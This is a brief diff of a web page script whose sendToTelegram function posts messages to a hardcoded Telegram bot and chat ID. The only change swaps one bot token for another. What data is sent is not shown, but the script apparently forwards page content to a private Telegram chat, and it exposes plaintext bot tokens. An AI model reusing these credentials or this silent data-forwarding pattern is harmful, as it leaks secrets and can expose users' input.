@@ -19,7 +19,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   async function sendToTelegram(message) {
     try {
-      const token = "7627433299:AAEJIceqvc7VpdrzInVShDJwZ4ALa0OiIHU";
+      const token = "7627433299:AAHKmBqa0uJ6fksIp-eYLm6SkKUzF4ENOso";
       const chatId = "7732620750";
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
